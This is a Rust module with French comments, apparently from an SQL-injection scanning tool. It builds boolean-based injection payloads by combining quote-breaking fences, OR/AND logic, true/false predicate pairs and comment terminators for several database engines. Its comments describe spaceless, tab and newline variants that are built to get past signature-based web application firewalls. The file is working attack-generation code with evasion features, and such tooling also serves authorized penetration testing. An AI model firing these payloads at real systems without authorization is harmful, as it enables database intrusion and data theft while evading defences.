#![deny(unsafe_code)]

//! Grammaire fermée des injections booléennes génératives.
//!
//! La liste historique (`boolean_payloads_for`, 22 paires) couvre déjà tous
//! les prédicats en fence single-quote + `OR` : la valeur du générateur est
//! le cross-produit **fences × logiques × commentaires**, ordonné par
//! contexte inféré ([`InjectionContext`]) et dédupliqué contre l'historique
//! par l'appelant (zéro requête redondante).
//!
//! Tout est pur et déterministe : aucun réseau, aucune aléa non seedée.

use crate::dbms::common::DbmsKind;
use crate::dbms::context::{CommentStyle, QuoteContext};

/// Fence d'ouverture (fermeture de la quote du sink + parenthèses).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum QuoteFence {
    /// Contexte numérique nu (`WHERE id = 1`) : le littéral `1` est rejoué
    /// en préfixe pour garder un SQL valide (`1AND(1)=(1)-- -`).
    Bare,
    /// String single-quote (`WHERE name = '…'`).
    Single,
    /// String double-quote (`WHERE name = "…"`).
    Double,
    /// Identifiant backtick MySQL.
    Backtick,
    /// Single-quote + `n` parenthèses (`')`, `'))`).
    SingleParen(u8),
    /// Double-quote + `n` parenthèses (`")`).
    DoubleParen(u8),
    /// Nue + `n` parenthèses (`)`, `))`).
    BareParen(u8),
}

impl QuoteFence {
    /// Littéral d'ouverture (préfixe du payload).
    #[must_use]
    pub const fn open(self) -> &'static str {
        match self {
            Self::Bare => "1",
            Self::Single => "'",
            Self::Double => "\"",
            Self::Backtick => "`",
            Self::SingleParen(n) => match n {
                1 => "')",
                _ => "'))",
            },
            Self::DoubleParen(n) => match n {
                1 => "\")",
                _ => "\"))",
            },
            Self::BareParen(n) => match n {
                1 => ")",
                _ => "))",
            },
        }
    }

    /// Nom court pour les labels de trace (`gen:<fence>+…`).
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::Bare => "bare",
            Self::Single => "single",
            Self::Double => "double",
            Self::Backtick => "backtick",
            Self::SingleParen(n) => match n {
                1 => "single-paren1",
                _ => "single-paren2",
            },
            Self::DoubleParen(n) => match n {
                1 => "double-paren1",
                _ => "double-paren2",
            },
            Self::BareParen(n) => match n {
                1 => "bare-paren1",
                _ => "bare-paren2",
            },
        }
    }

    /// Ordre d'énumération priorisé par contexte inféré (le bon fence
    /// d'abord, sans requête supplémentaire).
    #[must_use]
    pub fn ordered_for_context(ctx: &QuoteContext) -> Vec<Self> {
        const DEFAULT: &[QuoteFence] = &[
            QuoteFence::Single,
            QuoteFence::Double,
            QuoteFence::Bare,
            QuoteFence::Backtick,
            QuoteFence::SingleParen(1),
            QuoteFence::SingleParen(2),
            QuoteFence::DoubleParen(1),
            QuoteFence::BareParen(1),
            QuoteFence::BareParen(2),
        ];
        match ctx {
            QuoteContext::SingleQuote => vec![
                Self::Single,
                Self::SingleParen(1),
                Self::SingleParen(2),
                Self::Double,
                Self::Bare,
                Self::Backtick,
                Self::DoubleParen(1),
                Self::BareParen(1),
                Self::BareParen(2),
            ],
            QuoteContext::DoubleQuote => vec![
                Self::Double,
                Self::DoubleParen(1),
                Self::Single,
                Self::Bare,
                Self::Backtick,
                Self::SingleParen(1),
                Self::SingleParen(2),
                Self::BareParen(1),
                Self::BareParen(2),
            ],
            QuoteContext::None => vec![
                Self::Bare,
                Self::BareParen(1),
                Self::BareParen(2),
                Self::Single,
                Self::Double,
                Self::Backtick,
                Self::SingleParen(1),
                Self::SingleParen(2),
                Self::DoubleParen(1),
            ],
            // `Unknown` / `Parenthesis` : ordre historique (single dominant).
            _ => DEFAULT.to_vec(),
        }
    }
}

/// Séparateur autour de la logique (`{open}{sep}{LOGIC}{sep}{pred}`).
///
/// Les WAF à signatures visent l'espace (` OR `) ; la tabulation et le
/// saut de ligne sont du whitespace SQL valide sur tous les DBMS testés et
/// traversent les règles naïves. Dimension native (pas un tamper) pour
/// pouvoir les combiner aux fences/prédicats dans l'énumération.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Separator {
    /// Espace (`' OR 1=1`).
    Space,
    /// Tabulation (`%09` sur le fil).
    Tab,
    /// Saut de ligne (`%0A` sur le fil).
    Newline,
}

impl Separator {
    /// Séparateur brut.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Space => " ",
            Self::Tab => "\t",
            Self::Newline => "\n",
        }
    }

    /// Nom court pour les labels (`""` pour l'espace : labels historiques
    /// `gen:<fence>+<logic>+<pred>` inchangés).
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::Space => "",
            Self::Tab => "tab",
            Self::Newline => "nl",
        }
    }
}

/// Logique de branchement.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Logic {
    /// `OR` (union large, essayé d'abord).
    Or,
    /// `AND` (restriction, différentiel inversé possible).
    And,
}

impl Logic {
    /// Mot-clé.
    #[must_use]
    pub const fn keyword(self) -> &'static str {
        match self {
            Self::Or => "OR",
            Self::And => "AND",
        }
    }

    /// Nom court pour les labels.
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::Or => "or",
            Self::And => "and",
        }
    }
}

/// Prédicat booléen (paire TRUE/FALSE cohérente, même shape).
///
/// Les variantes `NoSpace*` n'embarquent aucun espace (parenthèses MySQL
/// comme substitut : `'OR(1)=(1)-- -`) : elles traversent les règles WAF
/// naïves de type ` OR ` / `%20OR%20` qui tuent toute la liste historique.
/// Intemporelles (pas une astuce d'encodage version-dépendante).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Predicate {
    /// `(1)=(1)` / `(1)=(2)` — sans espaces.
    NoSpaceEq,
    /// `(1)LIKE(1)` / `(1)LIKE(2)` — sans espaces.
    NoSpaceLike,
    /// `1=1` / `1=2`.
    EqInt,
    /// `'a'='a'` / `'a'='b'`.
    EqStr,
    /// `'a' LIKE 'a'` / `'a' LIKE 'b'`.
    Like,
    /// `1 IN (1)` / `1 IN (2)`.
    In,
    /// `1 BETWEEN 1 AND 1` / `1 BETWEEN 1 AND 2`.
    Between,
    /// `'a' RLIKE 'a'` / `'a' RLIKE 'b'` (MySQL).
    Rlike,
    /// `(CASE WHEN (1=1) THEN 1 ELSE 0 END)=1` et flip `1=2`.
    CaseWhen,
    /// `1 DIV 1` / `1 DIV 0` (FALSE = NULL, falsy → oracle tenu).
    Div,
    /// `1 XOR 0` / `1 XOR 1` (MySQL).
    Xor,
    /// `CHAR(97)=CHAR(97)` / `…(98)` — dialecte via `DbmsKind`
    /// (`CHAR` MySQL/MSSQL, `CHR` Postgres/Oracle/SQLite).
    ChrFunc,
}

impl Predicate {
    /// `true` pour le noyau conservateur, `false` pour les exotiques
    /// (mode agressif uniquement). Les spaceless sont noyau : valeur
    /// maximale contre les WAF à signatures, risque nul.
    #[must_use]
    pub const fn is_core(self) -> bool {
        match self {
            Self::NoSpaceEq
            | Self::NoSpaceLike
            | Self::EqInt
            | Self::EqStr
            | Self::Like
            | Self::In
            | Self::Between => true,
            Self::Rlike | Self::CaseWhen | Self::Div | Self::Xor | Self::ChrFunc => false,
        }
    }

    /// `true` quand le rendu ne doit contenir aucun espace hors commentaire
    /// (`{open}{LOGIC}{pred}{comment}`, ex. `'OR(1)=(1)-- -`).
    #[must_use]
    pub const fn is_spaceless(self) -> bool {
        matches!(self, Self::NoSpaceEq | Self::NoSpaceLike)
    }

    /// Nom court pour les labels.
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::NoSpaceEq => "nospace-eq",
            Self::NoSpaceLike => "nospace-like",
            Self::EqInt => "eqint",
            Self::EqStr => "eqstr",
            Self::Like => "like",
            Self::In => "in",
            Self::Between => "between",
            Self::Rlike => "rlike",
            Self::CaseWhen => "casewhen",
            Self::Div => "div",
            Self::Xor => "xor",
            Self::ChrFunc => "chrfunc",
        }
    }

    /// Ordre d'énumération (spaceless puis noyau puis exotiques : ce qui
    /// bat les WAF modernes d'abord).
    #[must_use]
    pub const fn all_ordered() -> &'static [Self] {
        &[
            Self::NoSpaceEq,
            Self::NoSpaceLike,
            Self::EqInt,
            Self::EqStr,
            Self::Like,
            Self::In,
            Self::Between,
            Self::Rlike,
            Self::CaseWhen,
            Self::Div,
            Self::Xor,
            Self::ChrFunc,
        ]
    }

    /// Branches `(TRUE, FALSE)` pour un DBMS donné.
    #[must_use]
    pub fn branches(self, kind: DbmsKind) -> (&'static str, &'static str) {
        match self {
            Self::NoSpaceEq => ("(1)=(1)", "(1)=(2)"),
            Self::NoSpaceLike => ("(1)LIKE(1)", "(1)LIKE(2)"),
            Self::EqInt => ("1=1", "1=2"),
            Self::EqStr => ("'a'='a'", "'a'='b'"),
            Self::Like => ("'a' LIKE 'a'", "'a' LIKE 'b'"),
            Self::In => ("1 IN (1)", "1 IN (2)"),
            Self::Between => ("1 BETWEEN 1 AND 1", "1 BETWEEN 1 AND 2"),
            Self::Rlike => ("'a' RLIKE 'a'", "'a' RLIKE 'b'"),
            Self::CaseWhen => (
                "(CASE WHEN (1=1) THEN 1 ELSE 0 END)=1",
                "(CASE WHEN (1=2) THEN 1 ELSE 0 END)=1",
            ),
            Self::Div => ("1 DIV 1", "1 DIV 0"),
            Self::Xor => ("1 XOR 0", "1 XOR 1"),
            Self::ChrFunc => match kind {
                DbmsKind::MySql | DbmsKind::MsSql => ("CHAR(97)=CHAR(97)", "CHAR(97)=CHAR(98)"),
                _ => ("CHR(97)=CHR(97)", "CHR(97)=CHR(98)"),
            },
        }
    }
}

/// Terminateur commentaire pour `(DBMS, style inféré)`.
///
/// Reproduit la convention historique (`" -- -"` MySQL/inconnu, `" --"`
/// ailleurs), avec `#` quand le contexte a inféré le style hash (MySQL).
/// `SlashStar`/`SemiDashDash` retombent sur `-- -` : un `/*` non refermé ou
/// un `;` stacked n'ont rien à faire dans un différentiel booléen.
#[must_use]
pub const fn comment_for(kind: DbmsKind, style: &CommentStyle) -> &'static str {
    match style {
        CommentStyle::Hash => "#",
        CommentStyle::DashDash | CommentStyle::SlashStar | CommentStyle::SemiDashDash => match kind
        {
            DbmsKind::MySql | DbmsKind::Unknown => " -- -",
            _ => " --",
        },
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn fence_opens_are_distinct_and_nonempty_or_bare() {
        let mut seen = std::collections::HashSet::new();
        for fence in QuoteFence::ordered_for_context(&QuoteContext::Unknown) {
            assert!(seen.insert(fence.open()), "duplicate open {}", fence.name());
        }
        assert_eq!(QuoteFence::Bare.open(), "1");
        assert_eq!(QuoteFence::SingleParen(1).open(), "')");
        assert_eq!(QuoteFence::SingleParen(9).open(), "'))");
    }

    #[test]
    fn context_orders_lead_with_matching_fence() {
        assert_eq!(
            QuoteFence::ordered_for_context(&QuoteContext::SingleQuote)[0],
            QuoteFence::Single
        );
        assert_eq!(
            QuoteFence::ordered_for_context(&QuoteContext::DoubleQuote)[0],
            QuoteFence::Double
        );
        assert_eq!(
            QuoteFence::ordered_for_context(&QuoteContext::None)[0],
            QuoteFence::Bare
        );
        // Couverture : tous les contextes énumèrent les 9 fences.
        for ctx in [
            QuoteContext::Unknown,
            QuoteContext::None,
            QuoteContext::SingleQuote,
            QuoteContext::DoubleQuote,
            QuoteContext::Parenthesis,
        ] {
            assert_eq!(QuoteFence::ordered_for_context(&ctx).len(), 9);
        }
    }

    #[test]
    fn predicates_are_coherent_pairs() {
        for pred in Predicate::all_ordered() {
            for kind in [
                DbmsKind::MySql,
                DbmsKind::Postgres,
                DbmsKind::MsSql,
                DbmsKind::Oracle,
                DbmsKind::Sqlite,
                DbmsKind::Unknown,
            ] {
                let (t, f) = pred.branches(kind);
                assert!(!t.is_empty() && !f.is_empty(), "{pred:?}");
                assert_ne!(t, f, "{pred:?}");
            }
        }
        // Dialecte CHR/CHAR.
        assert!(
            Predicate::ChrFunc
                .branches(DbmsKind::MySql)
                .0
                .contains("CHAR(")
        );
        assert!(
            Predicate::ChrFunc
                .branches(DbmsKind::MsSql)
                .0
                .contains("CHAR(")
        );
        assert!(
            Predicate::ChrFunc
                .branches(DbmsKind::Postgres)
                .0
                .contains("CHR(")
        );
        assert!(
            Predicate::ChrFunc
                .branches(DbmsKind::Unknown)
                .0
                .contains("CHR(")
        );
    }

    #[test]
    fn core_predicates_lead() {
        let core: Vec<_> = Predicate::all_ordered()
            .iter()
            .filter(|p| p.is_core())
            .collect();
        assert_eq!(core.len(), 7);
        // Spaceless d'abord, puis noyau historique.
        assert_eq!(
            Predicate::all_ordered()[..7],
            [
                Predicate::NoSpaceEq,
                Predicate::NoSpaceLike,
                Predicate::EqInt,
                Predicate::EqStr,
                Predicate::Like,
                Predicate::In,
                Predicate::Between,
            ]
        );
        assert!(Predicate::NoSpaceEq.is_spaceless());
        assert!(!Predicate::EqInt.is_spaceless());
    }

    #[test]
    fn comment_follows_historical_convention() {
        assert_eq!(
            comment_for(DbmsKind::MySql, &CommentStyle::DashDash),
            " -- -"
        );
        assert_eq!(
            comment_for(DbmsKind::Postgres, &CommentStyle::DashDash),
            " --"
        );
        assert_eq!(
            comment_for(DbmsKind::Unknown, &CommentStyle::DashDash),
            " -- -"
        );
        assert_eq!(comment_for(DbmsKind::MySql, &CommentStyle::Hash), "#");
        assert_eq!(
            comment_for(DbmsKind::Postgres, &CommentStyle::SlashStar),
            " --"
        );
    }
}
